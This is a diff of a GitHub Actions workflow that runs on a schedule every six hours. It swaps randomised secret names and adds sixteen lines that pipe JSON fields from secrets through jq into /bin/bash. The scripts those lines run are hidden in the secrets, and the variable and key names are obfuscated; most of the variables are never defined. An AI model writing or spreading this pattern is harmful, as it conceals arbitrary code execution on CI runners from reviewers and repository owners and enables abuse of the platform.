@@ -3,7 +3,7 @@ name: liaogaitx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 3/6 * * *'
+    - cron: '42 2/6 * * *'
 
 jobs:
   build:
@@ -12,15 +12,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: liaogaitx
         env:
-          wwxlo681: ${{ secrets.wwxlo681 }}
+          witzg9841: ${{ secrets.witzg9841 }}
         run: |
-          echo $wwxlo681 | jq -r .ix817 | /bin/bash
-          echo $osjv09904 | jq -r .pj04 | /bin/bash
-          echo $rh9 | jq -r .spd012 | /bin/bash
-          echo $wml77623 | jq -r .cra450 | /bin/bash
-          echo $e54109 | jq -r .hdt6546 | /bin/bash
-          echo $bnvbf2774 | jq -r .g7933 | /bin/bash
-          echo $qc21979 | jq -r .wgwyp59545 | /bin/bash
-          echo $bdh5696 | jq -r .dxi29725 | /bin/bash
-          echo $xtz46503 | jq -r .znusv69 | /bin/bash
+          echo $witzg9841 | jq -r .t84961 | /bin/bash
+          echo $tigf33 | jq -r .ecy92620 | /bin/bash
+          echo $imen0939 | jq -r .hatgd5457 | /bin/bash
+          echo $nhecy40160 | jq -r .qkyas27 | /bin/bash
+          echo $uaxfd5 | jq -r .pncne264 | /bin/bash
+          echo $m1 | jq -r .srzaq204 | /bin/bash
+          echo $l44 | jq -r .e15880 | /bin/bash
+          echo $igm91 | jq -r .de941 | /bin/bash
+          echo $ib8 | jq -r .l22 | /bin/bash
+          echo $na2024 | jq -r .ukydr5835 | /bin/bash
+          echo $fmh4589 | jq -r .zbvv14 | /bin/bash
+          echo $zs534 | jq -r .vdgo594 | /bin/bash
+          echo $uwh898 | jq -r .jhu2 | /bin/bash
+          echo $qj8 | jq -r .ck1624 | /bin/bash
+          echo $sjo3 | jq -r .g467 | /bin/bash
+          echo $mlgmh28649 | jq -r .xmdal3378 | /bin/bash
 
